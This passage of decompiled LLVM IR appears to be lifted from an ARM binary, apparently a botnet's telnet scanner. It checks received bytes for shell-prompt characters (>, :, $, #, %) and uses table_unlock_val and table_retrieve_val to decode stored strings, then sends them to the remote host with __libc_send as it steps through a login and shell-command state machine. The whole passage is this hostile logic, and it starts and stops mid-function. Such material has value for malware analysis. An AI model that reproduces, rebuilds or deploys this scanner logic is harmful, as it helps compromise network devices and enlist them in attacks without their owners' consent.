  %v7_f910 = icmp eq i8 %v3_f90c, 62
  store i1 %v7_f910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f910, label %dec_label_pc_f974, label %bb441

bb441:                                            ; preds = %dec_label_pc_f908
  %v3_f914 = icmp ugt i8 %v3_f90c, 57
  store i1 %v3_f914, i1* %cpsr_c.global-to-local, align 1
  %v8_f914 = icmp eq i8 %v3_f90c, 58
  store i1 %v8_f914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f914, label %dec_label_pc_f974, label %dec_label_pc_f91c

dec_label_pc_f91c:                                ; preds = %bb441
  %v2_f91c = icmp ugt i8 %v3_f90c, 35
  store i1 %v2_f91c, i1* %cpsr_c.global-to-local, align 1
  %v7_f91c = icmp eq i8 %v3_f90c, 36
  store i1 %v7_f91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f91c, label %dec_label_pc_f974, label %dec_label_pc_f924

dec_label_pc_f924:                                ; preds = %dec_label_pc_f91c
  %v2_f924 = icmp ugt i8 %v3_f90c, 34
  store i1 %v2_f924, i1* %cpsr_c.global-to-local, align 1
  %v7_f924 = icmp eq i8 %v3_f90c, 35
  store i1 %v7_f924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f924, label %dec_label_pc_f974, label %dec_label_pc_f92c

dec_label_pc_f92c:                                ; preds = %dec_label_pc_f924
  %v2_f92c = icmp ugt i8 %v3_f90c, 36
  store i1 %v2_f92c, i1* %cpsr_c.global-to-local, align 1
  %v7_f92c = icmp eq i8 %v3_f90c, 37
  store i1 %v7_f92c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f92c, label %dec_label_pc_f974, label %dec_label_pc_f95c.preheader

dec_label_pc_f95c.preheader:                      ; preds = %dec_label_pc_f92c
  %v3_f930 = add i32 %v0_f53c, 28
  %v2_f934 = add i32 %v3_f930, %v3_f8f8
  store i32 %v2_f934, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f95c

dec_label_pc_f940:                                ; preds = %bb442
  %v2_f940 = icmp ugt i8 %v3_f964, 35
  store i1 %v2_f940, i1* %cpsr_c.global-to-local, align 1
  %v7_f940 = icmp eq i8 %v3_f964, 36
  store i1 %v7_f940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f940, label %dec_label_pc_f974, label %dec_label_pc_f948

dec_label_pc_f948:                                ; preds = %dec_label_pc_f940
  %v2_f948 = icmp ugt i8 %v3_f964, 34
  store i1 %v2_f948, i1* %cpsr_c.global-to-local, align 1
  %v7_f948 = icmp eq i8 %v3_f964, 35
  store i1 %v7_f948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f948, label %dec_label_pc_f974, label %dec_label_pc_f950

dec_label_pc_f950:                                ; preds = %dec_label_pc_f948
  %v2_f950 = icmp ugt i8 %v3_f964, 36
  store i1 %v2_f950, i1* %cpsr_c.global-to-local, align 1
  %v7_f950 = icmp eq i8 %v3_f964, 37
  store i1 %v7_f950, i1* %cpsr_z.global-to-local, align 1
  %v1_f954 = add i32 %v0_f954, -1
  store i32 %v1_f954, i32* %r3.global-to-local, align 4
  br i1 %v7_f950, label %dec_label_pc_f974, label %dec_label_pc_f95c

dec_label_pc_f95c:                                ; preds = %dec_label_pc_f95c.preheader, %dec_label_pc_f950
  %v0_f954 = phi i32 [ %v2_f934, %dec_label_pc_f95c.preheader ], [ %v1_f954, %dec_label_pc_f950 ]
  %v0_f95c = phi i32 [ %v1_f8fc, %dec_label_pc_f95c.preheader ], [ %v1_f95c, %dec_label_pc_f950 ]
  %v1_f95c = add i32 %v0_f95c, -1
  store i32 %v1_f95c, i32* %r1.global-to-local, align 4
  %v2_f95c = icmp ne i32 %v0_f95c, 0
  store i1 %v2_f95c, i1* %cpsr_c.global-to-local, align 1
  %v7_f95c = icmp eq i32 %v0_f95c, 1
  store i1 %v7_f95c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f95c, label %dec_label_pc_f4bc.backedge.thread565, label %dec_label_pc_f964

dec_label_pc_f964:                                ; preds = %dec_label_pc_f95c
  %v1_f964 = add i32 %v0_f954, -2
  %v2_f964 = inttoptr i32 %v1_f964 to i8*
  %v3_f964 = load i8, i8* %v2_f964, align 1
  %v4_f964 = zext i8 %v3_f964 to i32
  store i32 %v4_f964, i32* %r2.global-to-local, align 4
  %v2_f968 = icmp ugt i8 %v3_f964, 61
  store i1 %v2_f968, i1* %cpsr_c.global-to-local, align 1
  %v7_f968 = icmp eq i8 %v3_f964, 62
  store i1 %v7_f968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f968, label %dec_label_pc_f974, label %bb442

bb442:                                            ; preds = %dec_label_pc_f964
  %v3_f96c = icmp ugt i8 %v3_f964, 57
  store i1 %v3_f96c, i1* %cpsr_c.global-to-local, align 1
  %v8_f96c = icmp eq i8 %v3_f964, 58
  store i1 %v8_f96c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f96c, label %dec_label_pc_f974, label %dec_label_pc_f940

dec_label_pc_f974:                                ; preds = %dec_label_pc_f964, %bb442, %dec_label_pc_f950, %dec_label_pc_f948, %dec_label_pc_f940, %dec_label_pc_f92c, %dec_label_pc_f908, %dec_label_pc_f924, %dec_label_pc_f91c, %bb441
  %v0_f978 = phi i32 [ %v1_f8fc, %dec_label_pc_f92c ], [ %v1_f8fc, %dec_label_pc_f908 ], [ %v1_f8fc, %dec_label_pc_f924 ], [ %v1_f8fc, %dec_label_pc_f91c ], [ %v1_f8fc, %bb441 ], [ %v1_f95c, %dec_label_pc_f940 ], [ %v1_f95c, %dec_label_pc_f948 ], [ %v1_f95c, %dec_label_pc_f950 ], [ %v1_f95c, %bb442 ], [ %v1_f95c, %dec_label_pc_f964 ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f978 = add i32 %v0_f978, 1
  store i32 %v1_f978, i32* @r8, align 4
  %v1_f97c = call i32 @table_unlock_val(i32 6)
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_f98c = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_f98c, i32* %r0.global-to-local, align 4
  %v3_f990 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f990, i32* %r2.global-to-local, align 4
  store i32 %v3_f98c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f99c = load i32, i32* @r6, align 4
  %v1_f99c = add i32 %v0_f99c, 4
  %v2_f99c = inttoptr i32 %v1_f99c to i32*
  %v3_f99c = load i32, i32* %v2_f99c, align 4
  store i32 %v3_f99c, i32* %r0.global-to-local, align 4
  %v4_f9a0 = call i32 @__libc_send(i32 %v3_f99c, i32 %v3_f98c, i32 %v3_f990, i32 16384)
  store i32 %v4_f9a0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f9b0 = load i32, i32* @r6, align 4
  %v1_f9b0 = add i32 %v0_f9b0, 4
  %v2_f9b0 = inttoptr i32 %v1_f9b0 to i32*
  %v3_f9b0 = load i32, i32* %v2_f9b0, align 4
  store i32 %v3_f9b0, i32* %r0.global-to-local, align 4
  %v4_f9b4 = call i32 @__libc_send(i32 %v3_f9b0, i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f9bc = call i32 @table_lock_val(i32 6)
  store i32 %v1_f9bc, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_f9c4 = load i32, i32* @r6, align 4
  %v2_f9c4 = add i32 %v1_f9c4, 12
  %v3_f9c4 = inttoptr i32 %v2_f9c4 to i32*
  store i32 7, i32* %v3_f9c4, align 4
  br label %dec_label_pc_f72c

dec_label_pc_f9cc:                                ; preds = %dec_label_pc_f53c
  %v1_f9cc = add i32 %v0_f53c, 24
  %v2_f9cc = inttoptr i32 %v1_f9cc to i32*
  %v3_f9cc = load i32, i32* %v2_f9cc, align 4
  store i32 %v3_f9cc, i32* %r2.global-to-local, align 4
  %v1_f9d0 = add i32 %v3_f9cc, -1
  store i32 %v1_f9d0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9d4 = icmp eq i32 %v1_f9d0, 0
  store i1 %v2_f9d4, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_f9d0, 1
  br i1 %tmp443, label %dec_label_pc_f4bc.backedge.thread, label %dec_label_pc_f9dc

dec_label_pc_f9dc:                                ; preds = %dec_label_pc_f9cc
  %v2_f9dc = add i32 %v1_f9d0, %v0_f53c
  store i32 %v2_f9dc, i32* %r3.global-to-local, align 4
  %v1_f9e0 = add i32 %v2_f9dc, 28
  %v2_f9e0 = inttoptr i32 %v1_f9e0 to i8*
  %v3_f9e0 = load i8, i8* %v2_f9e0, align 1
  %v4_f9e0 = zext i8 %v3_f9e0 to i32
  store i32 %v4_f9e0, i32* %r3.global-to-local, align 4
  %v2_f9e4 = icmp ugt i8 %v3_f9e0, 61
  store i1 %v2_f9e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f9e4 = icmp eq i8 %v3_f9e0, 62
  store i1 %v7_f9e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9e4, label %dec_label_pc_fa48, label %bb444

bb444:                                            ; preds = %dec_label_pc_f9dc
  %v3_f9e8 = icmp ugt i8 %v3_f9e0, 57
  store i1 %v3_f9e8, i1* %cpsr_c.global-to-local, align 1
  %v8_f9e8 = icmp eq i8 %v3_f9e0, 58
  store i1 %v8_f9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f9e8, label %dec_label_pc_fa48, label %dec_label_pc_f9f0

dec_label_pc_f9f0:                                ; preds = %bb444
  %v2_f9f0 = icmp ugt i8 %v3_f9e0, 35
  store i1 %v2_f9f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9f0 = icmp eq i8 %v3_f9e0, 36
  store i1 %v7_f9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9f0, label %dec_label_pc_fa48, label %dec_label_pc_f9f8

dec_label_pc_f9f8:                                ; preds = %dec_label_pc_f9f0
  %v2_f9f8 = icmp ugt i8 %v3_f9e0, 34
  store i1 %v2_f9f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9f8 = icmp eq i8 %v3_f9e0, 35
  store i1 %v7_f9f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9f8, label %dec_label_pc_fa48, label %dec_label_pc_fa00

dec_label_pc_fa00:                                ; preds = %dec_label_pc_f9f8
  %v2_fa00 = icmp ugt i8 %v3_f9e0, 36
  store i1 %v2_fa00, i1* %cpsr_c.global-to-local, align 1
  %v7_fa00 = icmp eq i8 %v3_f9e0, 37
  store i1 %v7_fa00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa00, label %dec_label_pc_fa48, label %dec_label_pc_fa30.preheader

dec_label_pc_fa30.preheader:                      ; preds = %dec_label_pc_fa00
  %v3_fa04 = add i32 %v0_f53c, 28
  %v2_fa08 = add i32 %v3_fa04, %v3_f9cc
  store i32 %v2_fa08, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fa30

dec_label_pc_fa14:                                ; preds = %bb445
  %v2_fa14 = icmp ugt i8 %v3_fa38, 35
  store i1 %v2_fa14, i1* %cpsr_c.global-to-local, align 1
  %v7_fa14 = icmp eq i8 %v3_fa38, 36
  store i1 %v7_fa14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa14, label %dec_label_pc_fa48, label %dec_label_pc_fa1c

dec_label_pc_fa1c:                                ; preds = %dec_label_pc_fa14
  %v2_fa1c = icmp ugt i8 %v3_fa38, 34
  store i1 %v2_fa1c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa1c = icmp eq i8 %v3_fa38, 35
  store i1 %v7_fa1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa1c, label %dec_label_pc_fa48, label %dec_label_pc_fa24

dec_label_pc_fa24:                                ; preds = %dec_label_pc_fa1c
  %v2_fa24 = icmp ugt i8 %v3_fa38, 36
  store i1 %v2_fa24, i1* %cpsr_c.global-to-local, align 1
  %v7_fa24 = icmp eq i8 %v3_fa38, 37
  store i1 %v7_fa24, i1* %cpsr_z.global-to-local, align 1
  %v1_fa28 = add i32 %v0_fa28, -1
  store i32 %v1_fa28, i32* %r3.global-to-local, align 4
  br i1 %v7_fa24, label %dec_label_pc_fa48, label %dec_label_pc_fa30

dec_label_pc_fa30:                                ; preds = %dec_label_pc_fa30.preheader, %dec_label_pc_fa24
  %v0_fa28 = phi i32 [ %v2_fa08, %dec_label_pc_fa30.preheader ], [ %v1_fa28, %dec_label_pc_fa24 ]
  %v0_fa30 = phi i32 [ %v1_f9d0, %dec_label_pc_fa30.preheader ], [ %v1_fa30, %dec_label_pc_fa24 ]
  %v1_fa30 = add i32 %v0_fa30, -1
  store i32 %v1_fa30, i32* %r1.global-to-local, align 4
  %v2_fa30 = icmp ne i32 %v0_fa30, 0
  store i1 %v2_fa30, i1* %cpsr_c.global-to-local, align 1
  %v7_fa30 = icmp eq i32 %v0_fa30, 1
  store i1 %v7_fa30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa30, label %dec_label_pc_f4bc.backedge.thread565, label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %dec_label_pc_fa30
  %v1_fa38 = add i32 %v0_fa28, -2
  %v2_fa38 = inttoptr i32 %v1_fa38 to i8*
  %v3_fa38 = load i8, i8* %v2_fa38, align 1
  %v4_fa38 = zext i8 %v3_fa38 to i32
  store i32 %v4_fa38, i32* %r2.global-to-local, align 4
  %v2_fa3c = icmp ugt i8 %v3_fa38, 61
  store i1 %v2_fa3c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa3c = icmp eq i8 %v3_fa38, 62
  store i1 %v7_fa3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa3c, label %dec_label_pc_fa48, label %bb445

bb445:                                            ; preds = %dec_label_pc_fa38
  %v3_fa40 = icmp ugt i8 %v3_fa38, 57
  store i1 %v3_fa40, i1* %cpsr_c.global-to-local, align 1
  %v8_fa40 = icmp eq i8 %v3_fa38, 58
  store i1 %v8_fa40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fa40, label %dec_label_pc_fa48, label %dec_label_pc_fa14

dec_label_pc_fa48:                                ; preds = %dec_label_pc_fa38, %bb445, %dec_label_pc_fa24, %dec_label_pc_fa1c, %dec_label_pc_fa14, %dec_label_pc_fa00, %dec_label_pc_f9dc, %dec_label_pc_f9f8, %dec_label_pc_f9f0, %bb444
  %v0_fa4c = phi i32 [ %v1_f9d0, %dec_label_pc_fa00 ], [ %v1_f9d0, %dec_label_pc_f9dc ], [ %v1_f9d0, %dec_label_pc_f9f8 ], [ %v1_f9d0, %dec_label_pc_f9f0 ], [ %v1_f9d0, %bb444 ], [ %v1_fa30, %dec_label_pc_fa14 ], [ %v1_fa30, %dec_label_pc_fa1c ], [ %v1_fa30, %dec_label_pc_fa24 ], [ %v1_fa30, %bb445 ], [ %v1_fa30, %dec_label_pc_fa38 ]
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_fa4c = add i32 %v0_fa4c, 1
  store i32 %v1_fa4c, i32* @r8, align 4
  %v1_fa50 = call i32 @table_unlock_val(i32 5)
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_fa60 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-60)
  store i32 %v3_fa60, i32* %r0.global-to-local, align 4
  %v3_fa64 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fa64, i32* %r2.global-to-local, align 4
  store i32 %v3_fa60, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fa70 = load i32, i32* @r6, align 4
  %v1_fa70 = add i32 %v0_fa70, 4
  %v2_fa70 = inttoptr i32 %v1_fa70 to i32*
  %v3_fa70 = load i32, i32* %v2_fa70, align 4
  store i32 %v3_fa70, i32* %r0.global-to-local, align 4
  %v4_fa74 = call i32 @__libc_send(i32 %v3_fa70, i32 %v3_fa60, i32 %v3_fa64, i32 16384)
  store i32 %v4_fa74, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fa84 = load i32, i32* @r6, align 4
  %v1_fa84 = add i32 %v0_fa84, 4
  %v2_fa84 = inttoptr i32 %v1_fa84 to i32*
  %v3_fa84 = load i32, i32* %v2_fa84, align 4
  store i32 %v3_fa84, i32* %r0.global-to-local, align 4
  %v4_fa88 = call i32 @__libc_send(i32 %v3_fa84, i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_fa90 = call i32 @table_lock_val(i32 5)
  store i32 %v1_fa90, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_fa98 = load i32, i32* @r6, align 4
  %v2_fa98 = add i32 %v1_fa98, 12
  %v3_fa98 = inttoptr i32 %v2_fa98 to i32*
  store i32 6, i32* %v3_fa98, align 4
  br label %dec_label_pc_f72c

dec_label_pc_fb1c:                                ; preds = %dec_label_pc_f53c
  %v1_fb1c = add i32 %v0_f53c, 24
  %v2_fb1c = inttoptr i32 %v1_fb1c to i32*
  %v3_fb1c = load i32, i32* %v2_fb1c, align 4
  store i32 %v3_fb1c, i32* %r2.global-to-local, align 4
  %v1_fb20 = add i32 %v3_fb1c, -1
  store i32 %v1_fb20, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb24 = icmp eq i32 %v1_fb20, 0
  store i1 %v2_fb24, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_fb20, 1
  br i1 %tmp446, label %dec_label_pc_f4bc.backedge.thread, label %dec_label_pc_fb2c

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_fb1c
  %v2_fb2c = add i32 %v1_fb20, %v0_f53c
  store i32 %v2_fb2c, i32* %r3.global-to-local, align 4
  %v1_fb30 = add i32 %v2_fb2c, 28
  %v2_fb30 = inttoptr i32 %v1_fb30 to i8*
  %v3_fb30 = load i8, i8* %v2_fb30, align 1
  %v4_fb30 = zext i8 %v3_fb30 to i32
  store i32 %v4_fb30, i32* %r3.global-to-local, align 4
  %v2_fb34 = icmp ugt i8 %v3_fb30, 61
  store i1 %v2_fb34, i1* %cpsr_c.global-to-local, align 1
  %v7_fb34 = icmp eq i8 %v3_fb30, 62
  store i1 %v7_fb34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb34, label %dec_label_pc_fb98, label %bb447

bb447:                                            ; preds = %dec_label_pc_fb2c
  %v3_fb38 = icmp ugt i8 %v3_fb30, 57
  store i1 %v3_fb38, i1* %cpsr_c.global-to-local, align 1
  %v8_fb38 = icmp eq i8 %v3_fb30, 58
  store i1 %v8_fb38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb38, label %dec_label_pc_fb98, label %dec_label_pc_fb40

dec_label_pc_fb40:                                ; preds = %bb447
  %v2_fb40 = icmp ugt i8 %v3_fb30, 35
  store i1 %v2_fb40, i1* %cpsr_c.global-to-local, align 1
  %v7_fb40 = icmp eq i8 %v3_fb30, 36
  store i1 %v7_fb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb40, label %dec_label_pc_fb98, label %dec_label_pc_fb48

dec_label_pc_fb48:                                ; preds = %dec_label_pc_fb40
  %v2_fb48 = icmp ugt i8 %v3_fb30, 34
  store i1 %v2_fb48, i1* %cpsr_c.global-to-local, align 1
  %v7_fb48 = icmp eq i8 %v3_fb30, 35
  store i1 %v7_fb48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb48, label %dec_label_pc_fb98, label %dec_label_pc_fb50

dec_label_pc_fb50:                                ; preds = %dec_label_pc_fb48
  %v2_fb50 = icmp ugt i8 %v3_fb30, 36
  store i1 %v2_fb50, i1* %cpsr_c.global-to-local, align 1
  %v7_fb50 = icmp eq i8 %v3_fb30, 37
  store i1 %v7_fb50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb50, label %dec_label_pc_fb98, label %dec_label_pc_fb80.preheader

dec_label_pc_fb80.preheader:                      ; preds = %dec_label_pc_fb50
  %v3_fb54 = add i32 %v0_f53c, 28
  %v2_fb58 = add i32 %v3_fb54, %v3_fb1c
  store i32 %v2_fb58, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fb80

dec_label_pc_fb64:                                ; preds = %bb448
  %v2_fb64 = icmp ugt i8 %v3_fb88, 35
  store i1 %v2_fb64, i1* %cpsr_c.global-to-local, align 1
  %v7_fb64 = icmp eq i8 %v3_fb88, 36
  store i1 %v7_fb64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb64, label %dec_label_pc_fb98, label %dec_label_pc_fb6c

dec_label_pc_fb6c:                                ; preds = %dec_label_pc_fb64
  %v2_fb6c = icmp ugt i8 %v3_fb88, 34
  store i1 %v2_fb6c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb6c = icmp eq i8 %v3_fb88, 35
  store i1 %v7_fb6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb6c, label %dec_label_pc_fb98, label %dec_label_pc_fb74

dec_label_pc_fb74:                                ; preds = %dec_label_pc_fb6c
  %v2_fb74 = icmp ugt i8 %v3_fb88, 36
  store i1 %v2_fb74, i1* %cpsr_c.global-to-local, align 1
  %v7_fb74 = icmp eq i8 %v3_fb88, 37
  store i1 %v7_fb74, i1* %cpsr_z.global-to-local, align 1
  %v1_fb78 = add i32 %v0_fb78, -1
  store i32 %v1_fb78, i32* %r3.global-to-local, align 4
  br i1 %v7_fb74, label %dec_label_pc_fb98, label %dec_label_pc_fb80

dec_label_pc_fb80:                                ; preds = %dec_label_pc_fb80.preheader, %dec_label_pc_fb74
  %v0_fb78 = phi i32 [ %v2_fb58, %dec_label_pc_fb80.preheader ], [ %v1_fb78, %dec_label_pc_fb74 ]
  %v0_fb80 = phi i32 [ %v1_fb20, %dec_label_pc_fb80.preheader ], [ %v1_fb80, %dec_label_pc_fb74 ]
  %v1_fb80 = add i32 %v0_fb80, -1
  store i32 %v1_fb80, i32* %r1.global-to-local, align 4
  %v2_fb80 = icmp ne i32 %v0_fb80, 0
  store i1 %v2_fb80, i1* %cpsr_c.global-to-local, align 1
  %v7_fb80 = icmp eq i32 %v0_fb80, 1
  store i1 %v7_fb80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb80, label %dec_label_pc_f4bc.backedge.thread565, label %dec_label_pc_fb88

dec_label_pc_fb88:                                ; preds = %dec_label_pc_fb80
  %v1_fb88 = add i32 %v0_fb78, -2
  %v2_fb88 = inttoptr i32 %v1_fb88 to i8*
  %v3_fb88 = load i8, i8* %v2_fb88, align 1
  %v4_fb88 = zext i8 %v3_fb88 to i32
  store i32 %v4_fb88, i32* %r2.global-to-local, align 4
  %v2_fb8c = icmp ugt i8 %v3_fb88, 61
  store i1 %v2_fb8c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb8c = icmp eq i8 %v3_fb88, 62
  store i1 %v7_fb8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb8c, label %dec_label_pc_fb98, label %bb448

bb448:                                            ; preds = %dec_label_pc_fb88
  %v3_fb90 = icmp ugt i8 %v3_fb88, 57
  store i1 %v3_fb90, i1* %cpsr_c.global-to-local, align 1
  %v8_fb90 = icmp eq i8 %v3_fb88, 58
  store i1 %v8_fb90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb90, label %dec_label_pc_fb98, label %dec_label_pc_fb64

dec_label_pc_fb98:                                ; preds = %dec_label_pc_fb88, %bb448, %dec_label_pc_fb74, %dec_label_pc_fb6c, %dec_label_pc_fb64, %dec_label_pc_fb50, %dec_label_pc_fb2c, %dec_label_pc_fb48, %dec_label_pc_fb40, %bb447
  %v0_fb9c = phi i32 [ %v1_fb20, %dec_label_pc_fb50 ], [ %v1_fb20, %dec_label_pc_fb2c ], [ %v1_fb20, %dec_label_pc_fb48 ], [ %v1_fb20, %dec_label_pc_fb40 ], [ %v1_fb20, %bb447 ], [ %v1_fb80, %dec_label_pc_fb64 ], [ %v1_fb80, %dec_label_pc_fb6c ], [ %v1_fb80, %dec_label_pc_fb74 ], [ %v1_fb80, %bb448 ], [ %v1_fb80, %dec_label_pc_fb88 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_fb9c = add i32 %v0_fb9c, 1
  store i32 %v1_fb9c, i32* @r8, align 4
  %v1_fba0 = call i32 @table_unlock_val(i32 7)
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_fbb0 = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_fbb0, i32* %r0.global-to-local, align 4
  %v3_fbb4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fbb4, i32* %r2.global-to-local, align 4
  store i32 %v3_fbb0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fbc0 = load i32, i32* @r6, align 4
  %v1_fbc0 = add i32 %v0_fbc0, 4
  %v2_fbc0 = inttoptr i32 %v1_fbc0 to i32*
  %v3_fbc0 = load i32, i32* %v2_fbc0, align 4
  store i32 %v3_fbc0, i32* %r0.global-to-local, align 4
  %v4_fbc4 = call i32 @__libc_send(i32 %v3_fbc0, i32 %v3_fbb0, i32 %v3_fbb4, i32 16384)
  store i32 %v4_fbc4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fbd4 = load i32, i32* @r6, align 4
  %v1_fbd4 = add i32 %v0_fbd4, 4
  %v2_fbd4 = inttoptr i32 %v1_fbd4 to i32*
  %v3_fbd4 = load i32, i32* %v2_fbd4, align 4
  store i32 %v3_fbd4, i32* %r0.global-to-local, align 4
  %v4_fbd8 = call i32 @__libc_send(i32 %v3_fbd4, i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_fbe0 = call i32 @table_lock_val(i32 7)
  store i32 %v1_fbe0, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_fbe8 = load i32, i32* @r6, align 4
  %v2_fbe8 = add i32 %v1_fbe8, 12
  %v3_fbe8 = inttoptr i32 %v2_fbe8 to i32*
  store i32 9, i32* %v3_fbe8, align 4
  br label %dec_label_pc_f72c

dec_label_pc_fbf0:                                ; preds = %dec_label_pc_f53c
  %v1_fbf0 = add i32 %v0_f53c, 24
  %v2_fbf0 = inttoptr i32 %v1_fbf0 to i32*
  %v3_fbf0 = load i32, i32* %v2_fbf0, align 4
  store i32 %v3_fbf0, i32* %r2.global-to-local, align 4
  %v1_fbf4 = add i32 %v3_fbf0, -1
  store i32 %v1_fbf4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbf8 = icmp eq i32 %v1_fbf4, 0
  store i1 %v2_fbf8, i1* %cpsr_z.global-to-local, align 1
  %tmp449 = icmp slt i32 %v1_fbf4, 1
  br i1 %tmp449, label %dec_label_pc_fc5c, label %dec_label_pc_fc00

dec_label_pc_fc00:                                ; preds = %dec_label_pc_fbf0
  %v2_fc00 = add i32 %v1_fbf4, %v0_f53c
  store i32 %v2_fc00, i32* %r3.global-to-local, align 4
  %v1_fc04 = add i32 %v2_fc00, 28
  %v2_fc04 = inttoptr i32 %v1_fc04 to i8*
  %v3_fc04 = load i8, i8* %v2_fc04, align 1
  %v4_fc04 = zext i8 %v3_fc04 to i32
  store i32 %v4_fc04, i32* %r3.global-to-local, align 4
  %v2_fc08 = icmp ugt i8 %v3_fc04, 61
  store i1 %v2_fc08, i1* %cpsr_c.global-to-local, align 1
  %v7_fc08 = icmp eq i8 %v3_fc04, 62
  store i1 %v7_fc08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc08, label %dec_label_pc_ff90, label %bb450

bb450:                                            ; preds = %dec_label_pc_fc00
  %v3_fc0c = icmp ugt i8 %v3_fc04, 57
  store i1 %v3_fc0c, i1* %cpsr_c.global-to-local, align 1
  %v8_fc0c = icmp eq i8 %v3_fc04, 58
  store i1 %v8_fc0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fc0c, label %dec_label_pc_ff90, label %dec_label_pc_fc14

dec_label_pc_fc14:                                ; preds = %bb450
  %v2_fc14 = icmp ugt i8 %v3_fc04, 35
  store i1 %v2_fc14, i1* %cpsr_c.global-to-local, align 1
  %v7_fc14 = icmp eq i8 %v3_fc04, 36
  store i1 %v7_fc14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc14, label %dec_label_pc_ff90, label %dec_label_pc_fc1c

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_fc14
  %v2_fc1c = icmp ugt i8 %v3_fc04, 34
  store i1 %v2_fc1c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc1c = icmp eq i8 %v3_fc04, 35
